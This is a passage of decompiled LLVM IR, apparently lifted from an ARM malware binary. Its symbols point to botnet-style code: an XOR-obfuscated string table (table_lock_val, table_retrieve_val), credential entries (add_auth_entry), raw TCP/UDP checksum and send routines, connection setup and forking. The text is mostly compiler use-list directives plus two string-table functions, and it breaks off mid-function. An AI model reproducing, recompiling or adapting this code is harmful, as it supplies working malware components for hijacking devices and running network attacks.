  uselistorder i32 %v1_f7c4, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f7a8, { 1, 0 }
  uselistorder i32 %v1_f798, { 2, 1, 0 }
  uselistorder i32 %v1_f794, { 1, 0 }
  uselistorder i32 %v0_f734, { 2, 5, 6, 20, 7, 8, 24, 9, 10, 21, 11, 12, 25, 13, 14, 22, 15, 16, 23, 4, 3, 19, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_f710, { 1, 2, 3, 0 }
  uselistorder i32 %v3_f70c, { 1, 0 }
  uselistorder i32 %v4_f6f0, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v2_f6dc, { 1, 0, 2 }
  uselistorder i32 %v3_f6d8, { 1, 0, 2 }
  uselistorder i32 %v0_101d4, { 1, 0, 2 }
  uselistorder i32 %v3_f6a0, { 1, 0 }
  uselistorder i32 %v1_f688, { 3, 2, 1, 0 }
  uselistorder i32 %v3_f684, { 1, 0 }
  uselistorder i32 %v3_f67c, { 1, 2, 0 }
  uselistorder i1 %v7_f66c, { 1, 0 }
  uselistorder i32 %v3_f668, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_f600, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f600, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f5e4, { 0, 2, 1 }
  uselistorder i32 %v1_f5dc, { 1, 0 }
  uselistorder i32 %v1_f59c, { 2, 1, 0 }
  uselistorder i32 %v1_f598, { 1, 0 }
  uselistorder i1 %v2_f578, { 1, 0, 2 }
  uselistorder i32 %v0_f574, { 1, 0, 2 }
  uselistorder i1 %v7_f540, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_f540, { 1, 0, 2 }
  uselistorder i32 %v2_f538, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_f510, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_f504, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f504, { 0, 2, 1 }
  uselistorder i32 %v3_f5c4, { 4, 7, 5, 6, 1, 0, 3, 2, 8 }
  uselistorder i32 %v1_f454, { 1, 0 }
  uselistorder i32 %v1_f43c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f448, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f3f0, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v5_f3e4, { 2, 1, 0 }
  uselistorder i32 %v1_f3c4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_f3a8, { 0, 1, 3, 2 }
  uselistorder i1 %v2_f3a0, { 1, 0 }
  uselistorder i1 %v9_f36c, { 1, 0 }
  uselistorder i32* %v2_f2ec, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_f2d0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_f2bc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_f204, { 1, 0 }
  uselistorder i32 %v3_f1f4, { 1, 2, 0, 3 }
  uselistorder i32 %v5_f1c4, { 0, 3, 1, 2 }
  uselistorder i1 %v2_f12c, { 1, 0 }
  uselistorder i1 %v2_f118, { 1, 0 }
  uselistorder i1 %v2_f104, { 1, 0 }
  uselistorder i32 %.461, { 2, 1, 0 }
  uselistorder i1 %v7_f0e0, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_f0c8, { 1, 0 }
  uselistorder i1 %v3_f0ac, { 1, 0, 2 }
  uselistorder i1 %v2_f098, { 1, 0 }
  uselistorder i1 %v2_f074, { 1, 0 }
  uselistorder i32 %v1_f024, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f010, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_f00c, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32 %stack_var_-1880.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10344, { 2, 3, 1, 0 }
  uselistorder i32 %v2_f86c, { 1, 2, 3, 0 }
  uselistorder i32 %v2_1000c, { 4, 5, 1, 0, 12, 13, 8, 11, 7, 10, 9, 6, 3, 2 }
  uselistorder i32 %v2_100b4, { 1, 2, 0 }
  uselistorder i32 %v2_f5d0, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_efb4, { 1, 3, 6, 5, 7, 0, 2, 4, 8, 9 }
  uselistorder i32 %v4_eea8, { 2, 1, 0, 3 }
  uselistorder i16 %v5_ee2c.le, { 1, 0 }
  uselistorder i32 %v0_ee20, { 2, 1, 0 }
  uselistorder i32 %v2_edf0, { 3, 2, 0, 1 }
  uselistorder i1 %v7_edc0, { 1, 0 }
  uselistorder i32 %v3_edb8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_eda4, { 1, 0 }
  uselistorder i32 %v2_ed88, { 1, 0, 2 }
  uselistorder i32 %storemerge328, { 1, 0 }
  uselistorder i32 %v0_ece0, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 10, 11, 12, 0, 1, 13, 5, 14, 2, 15, 6, 16, 3, 17, 4, 18, 7, 19, 20, 8, 21, 9, 22 }
  uselistorder i32* %r3.global-to-local, { 75, 62, 63, 64, 65, 66, 67, 68, 69, 70, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 85, 87, 88, 41, 0, 1, 2, 42, 43, 44, 45, 46, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 17, 15, 16, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 135, 71, 72, 73, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 114, 115, 116, 117, 118, 119, 120, 121, 123, 124, 126, 125, 122, 127, 165, 166, 128, 129, 74, 130, 131, 132, 133, 134, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 157, 160, 159, 108, 161, 162, 163, 164, 105, 106, 107, 109, 110, 111, 112, 113 }
  uselistorder i32* %r2.global-to-local, { 53, 54, 35, 36, 37, 38, 39, 40, 41, 42, 43, 55, 56, 57, 58, 27, 44, 0, 1, 28, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 45, 46, 47, 48, 49, 50, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 94, 95, 97, 98, 100, 99, 96, 101, 102, 51, 103, 118, 119, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 52, 114, 115, 116, 117, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93 }
  uselistorder i32* %r1.global-to-local, { 42, 43, 44, 45, 46, 47, 48, 49, 50, 58, 60, 61, 62, 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 105, 36, 37, 38, 39, 40, 41, 92, 93, 51, 52, 53, 54, 55, 56, 57, 63, 64, 65, 66, 67, 68, 94, 95, 96, 97, 98, 99, 100, 101, 59, 102, 103, 104, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91 }
  uselistorder i32* %ip.global-to-local, { 0, 4, 5, 6, 7, 17, 15, 16, 18, 1, 19, 20, 21, 22, 23, 24, 3, 2, 25, 26, 27, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 149, 131, 159, 29, 117, 75, 76, 136, 137, 119, 120, 84, 85, 86, 87, 88, 0, 126, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 20, 21, 22, 17, 18, 19, 23, 24, 25, 26, 27, 28, 135, 30, 35, 31, 32, 33, 34, 36, 37, 38, 39, 40, 44, 45, 46, 41, 42, 43, 47, 48, 49, 50, 51, 52, 56, 57, 58, 53, 54, 55, 59, 60, 61, 62, 63, 64, 72, 73, 74, 68, 69, 70, 77, 78, 79, 80, 82, 83, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 115, 106, 107, 108, 103, 104, 105, 109, 110, 111, 112, 113, 114, 121, 122, 123, 124, 125, 134, 127, 128, 129, 130, 138, 140, 139, 141, 142, 143, 144, 145, 146, 147, 148, 116, 118, 150, 151, 152, 153, 154, 160, 161, 162, 163, 164, 167, 169, 170, 168, 165, 166, 67, 71, 65, 171, 66, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 133, 210, 211, 132, 212, 213, 241, 214, 215, 216, 217, 218, 219, 240, 220, 221, 222, 223, 224, 239, 225, 226, 227, 238, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 155, 156, 157, 81, 158 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 145, 127, 155, 29, 115, 116, 132, 68, 71, 133, 117, 84, 85, 86, 87, 0, 131, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 20, 21, 22, 17, 18, 19, 23, 24, 25, 26, 27, 28, 130, 30, 35, 31, 32, 33, 34, 36, 37, 38, 39, 40, 44, 45, 46, 41, 42, 43, 47, 48, 49, 50, 51, 52, 56, 57, 58, 53, 54, 55, 59, 60, 61, 62, 63, 64, 73, 75, 76, 69, 70, 72, 77, 79, 80, 81, 82, 83, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 112, 103, 104, 105, 100, 101, 102, 106, 107, 108, 109, 110, 111, 118, 119, 120, 121, 122, 129, 123, 124, 125, 126, 134, 136, 135, 137, 138, 139, 140, 141, 142, 143, 144, 113, 114, 146, 147, 148, 149, 150, 157, 158, 159, 162, 164, 165, 163, 160, 161, 74, 67, 65, 166, 66, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 128, 203, 204, 235, 205, 206, 234, 207, 208, 209, 210, 211, 212, 233, 213, 214, 215, 216, 217, 232, 218, 219, 220, 156, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 151, 152, 153, 78, 154 }
  uselistorder i32 (i32)* @resolv_entries_free, { 1, 0 }
  uselistorder i16** @global_var_22444.151, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_22444.151 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 8, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), { 5, 7, 2, 8, 6, 9, 3, 10, 0, 11, 1, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 15, 14, 13, 12, 11, 10, 9, 19, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 18, 17, 16, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 10, 11 }
  uselistorder i8 34, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 14, 15, 16, 17, 4, 5, 18, 19, 20, 21, 6, 7, 8, 9, 10, 11, 12, 13, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 16, 17, 18, 19, 4, 5, 6, 7, 20, 21, 22, 23, 8, 9, 10, 11, 12, 13, 14, 15, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 62, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 61, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i32 (i32)* @resolv_lookup, { 1, 0 }
  uselistorder i32 (i32)* @table_lock_val, { 50, 49, 37, 36, 35, 43, 48, 47, 46, 45, 44, 42, 41, 40, 39, 38, 34, 33, 2, 30, 29, 28, 32, 31, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 39, 14, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42 }
  uselistorder i32 (i32)* @table_unlock_val, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 3, 22, 21, 20, 24, 23, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 2, 0 }
  uselistorder i32 384, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2242c.163 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 4, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 29, { 4, 3, 0, 1, 2 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_19a94.180 to i32), { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19a7c.174 to i32), { 0, 2, 1, 3 }
  uselistorder i8* @global_var_22439.169, { 1, 0 }
  uselistorder i16* @global_var_2242e.168, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2 }
  uselistorder i32 5888, { 0, 2, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_2242c.163 to i32), { 2, 3, 1, 0, 4, 5 }
  uselistorder i8* @global_var_22438.164, { 1, 0 }
  uselistorder i8** @global_var_22418.160, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_22418.160 to i32), { 0, 7, 1, 6, 2, 5, 4, 3 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 74, 71, 21, 20, 70, 69, 68, 72, 67, 66, 65, 73, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 2, 1, 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_24f30.158, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_24f2c.156, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_24f2c.156 to i32), { 1, 0, 2, 3, 4 }
  uselistorder i32 356, { 0, 5, 6, 7, 1, 8, 10, 2, 11, 12, 3, 4, 9 }
  uselistorder i32 388, { 2, 3, 6, 0, 1, 4, 5, 7 }
  uselistorder i32* @global_var_22448.145, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_24f10.62, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_24f10.62 to i32), { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_24f34.143, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10454, { 1, 0 }
  uselistorder label %dec_label_pc_f6b4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f6b4.backedge.thread562, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_f6b4.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10408, { 1, 0 }
  uselistorder label %dec_label_pc_10368, { 1, 0 }
  uselistorder label %dec_label_pc_1015c, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_10124, { 1, 0 }
  uselistorder label %dec_label_pc_10110, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10100, { 1, 0 }
  uselistorder label %dec_label_pc_fff0, { 1, 0 }
  uselistorder label %dec_label_pc_ff24, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_ff0c, { 1, 0 }
  uselistorder label %dec_label_pc_fe20, { 1, 0 }
  uselistorder label %dec_label_pc_fd64, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fd4c, { 1, 0 }
  uselistorder label %dec_label_pc_fc20, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fc08, { 1, 0 }
  uselistorder label %dec_label_pc_fb4c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fb34, { 1, 0 }
  uselistorder label %dec_label_pc_fac0, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread104, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fa8c, { 1, 0 }
  uselistorder label %.thread100, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fa6c, { 1, 0 }
  uselistorder label %dec_label_pc_fa58, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_fa14, { 1, 0 }
  uselistorder label %dec_label_pc_fa14.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f9a8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f990, { 1, 0 }
  uselistorder label %dec_label_pc_f904, { 6, 7, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_f8fc, { 4, 2, 5, 1, 0, 6, 3 }
  uselistorder label %dec_label_pc_f8e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f7c0, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %bb420, { 1, 0 }
  uselistorder label %dec_label_pc_f788, { 1, 0 }
  uselistorder label %dec_label_pc_f71c, { 1, 0 }
  uselistorder label %.thread83, { 1, 0 }
  uselistorder label %dec_label_pc_f6cc, { 1, 0 }
  uselistorder label %dec_label_pc_f6bc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f6bc.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_f6b0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f698, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %dec_label_pc_f5b8, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 1, 0 }
  uselistorder label %bb408, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_f4a8.dec_label_pc_f4a8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f484.dec_label_pc_f484_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f478, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f460, { 1, 0 }
  uselistorder label %dec_label_pc_f43c, { 1, 0 }
  uselistorder label %dec_label_pc_f2e4, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_f2d0, { 1, 0 }
  uselistorder label %bb405, { 1, 0 }
  uselistorder label %dec_label_pc_f164, { 1, 0 }
  uselistorder label %dec_label_pc_f158, { 1, 0 }
  uselistorder label %dec_label_pc_f14c, { 1, 0 }
  uselistorder label %dec_label_pc_f140, { 1, 0 }
  uselistorder label %dec_label_pc_f134, { 1, 0 }
  uselistorder label %dec_label_pc_f120, { 1, 0 }
  uselistorder label %dec_label_pc_f10c, { 1, 0 }
  uselistorder label %dec_label_pc_f0f8, { 1, 0 }
  uselistorder label %dec_label_pc_f0d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f0b4, { 1, 0 }
  uselistorder label %dec_label_pc_f0a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f084, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f060, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_f00c, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_ee20, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24f3c.217 to i32), i32* @r2, align 4
  %v3_10460 = mul i32 %arg1, 8
  %v2_10464 = add i32 %v3_10460, ptrtoint (i32* @global_var_24f3c.217 to i32)
  store i32 %v2_10464, i32* @r3, align 4
  %v2_10468 = icmp eq i32* %arg2, null
  br i1 %v2_10468, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_104704 = inttoptr i32 %v2_10464 to i32*
  %v4_104705 = load i32, i32* %v3_104704, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_1046c = add i32 %v3_10460, add (i32 ptrtoint (i32* @global_var_24f3c.217 to i32), i32 4)
  %v3_1046c = inttoptr i32 %v2_1046c to i16*
  %v4_1046c = load i16, i16* %v3_1046c, align 4
  %v5_1046c = zext i16 %v4_1046c to i32
  store i32 %v5_1046c, i32* @r3, align 4
  %v3_10470 = inttoptr i32 %v2_10464 to i32*
  %v4_10470 = load i32, i32* %v3_10470, align 4
  store i32 %v5_1046c, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_104706 = phi i32 [ %v4_104705, %.thread ], [ %v4_10470, %bb ]
  ret i32 %v4_104706

; uselistorder directives
  uselistorder i32 %v2_10464, { 1, 0, 2 }
  uselistorder i32 %v3_10460, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10488 = mul i32 %arg1, 8
  %v2_1048c = add i32 %v3_10488, ptrtoint (i32* @global_var_24f3c.217 to i32)
  %v2_10490 = load i32, i32* @global_var_2228c.220, align 4
  store i32 %v2_10490, i32* @r1, align 4
  %v1_10494 = add i32 %v3_10488, add (i32 ptrtoint (i32* @global_var_24f3c.217 to i32), i32 4)
  %v2_10494 = inttoptr i32 %v1_10494 to i16*
  %v3_10494 = load i16, i16* %v2_10494, align 4
  %v3_10498 = udiv i32 %v2_10490, 256
  %v2_1049c = icmp eq i16 %v3_10494, 0
  %v3_104a0 = udiv i32 %v2_10490, 65536
  store i32 %v3_104a0, i32* @r3, align 4
  %v3_104a4 = load i32, i32* @r4, align 4
  store i32 %v3_104a4, i32* %stack_var_-16, align 4
  %v1_104a8 = urem i32 %v3_10498, 256
  store i32 %v1_104a8, i32* %r6.global-to-local, align 4
  %v1_104ac = urem i32 %v3_104a0, 256
  store i32 %v1_104ac, i32* %r5.global-to-local, align 4
  %v3_104b0 = udiv i32 %v2_10490, 16777216
  store i32 %v3_104b0, i32* %r4.global-to-local, align 4
  %v1_104b4 = urem i32 %v2_10490, 256
  store i32 %v1_104b4, i32* %lr.global-to-local, align 4
  br i1 %v2_1049c, label %dec_label_pc_10510, label %dec_label_pc_104bc

dec_label_pc_104bc:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_104c0 = inttoptr i32 %v2_1048c to i32*
  br label %dec_label_pc_104c0

dec_label_pc_104c0:                               ; preds = %dec_label_pc_104c0.dec_label_pc_104c0_crit_edge, %dec_label_pc_104bc
  %v0_104c8 = phi i32 [ %v0_104c8.pre, %dec_label_pc_104c0.dec_label_pc_104c0_crit_edge ], [ %v1_104b4, %dec_label_pc_104bc ]
  %v2_104cc = phi i32 [ %v1_10504, %dec_label_pc_104c0.dec_label_pc_104c0_crit_edge ], [ 0, %dec_label_pc_104bc ]
  %v2_104c0 = load i32, i32* %v1_104c0, align 4
  %v2_104c4 = add i32 %v2_104c0, %v2_104cc
  %v3_104c4 = inttoptr i32 %v2_104c4 to i8*
  %v4_104c4 = load i8, i8* %v3_104c4, align 1
  %v6_104c4 = zext i8 %v4_104c4 to i32
  %v2_104c8 = xor i32 %v6_104c4, %v0_104c8
  %v1_104cc = trunc i32 %v2_104c8 to i8
  store i8 %v1_104cc, i8* %v3_104c4, align 1
  %v2_104d0 = load i32, i32* %v1_104c0, align 4
  %v0_104d4 = load i32, i32* @ip, align 4
  %v2_104d4 = add i32 %v0_104d4, %v2_104d0
  %v3_104d4 = inttoptr i32 %v2_104d4 to i8*
  %v4_104d4 = load i8, i8* %v3_104d4, align 1
  %v6_104d4 = zext i8 %v4_104d4 to i32
  %v0_104d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_104d8 = xor i32 %v0_104d8, %v6_104d4
  %v1_104dc = trunc i32 %v2_104d8 to i8
  store i8 %v1_104dc, i8* %v3_104d4, align 1
  %v2_104e0 = load i32, i32* %v1_104c0, align 4
  %v0_104e4 = load i32, i32* @ip, align 4
  %v2_104e4 = add i32 %v0_104e4, %v2_104e0
  %v3_104e4 = inttoptr i32 %v2_104e4 to i8*
  %v4_104e4 = load i8, i8* %v3_104e4, align 1
  %v6_104e4 = zext i8 %v4_104e4 to i32
  %v0_104e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_104e8 = xor i32 %v0_104e8, %v6_104e4
  %v1_104ec = trunc i32 %v2_104e8 to i8
  store i8 %v1_104ec, i8* %v3_104e4, align 1
  %v2_104f0 = load i32, i32* %v1_104c0, align 4
  store i32 %v2_104f0, i32* @r1, align 4
  %v0_104f4 = load i32, i32* @ip, align 4
  %v2_104f4 = add i32 %v0_104f4, %v2_104f0
  %v3_104f4 = inttoptr i32 %v2_104f4 to i8*
  %v4_104f4 = load i8, i8* %v3_104f4, align 1
  %v6_104f4 = zext i8 %v4_104f4 to i32
  %v0_104f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_104f8 = xor i32 %v0_104f8, %v6_104f4
  store i32 %v2_104f8, i32* @r3, align 4
  %v1_104fc = trunc i32 %v2_104f8 to i8
  store i8 %v1_104fc, i8* %v3_104f4, align 1
  %v3_10500 = load i16, i16* %v2_10494, align 4
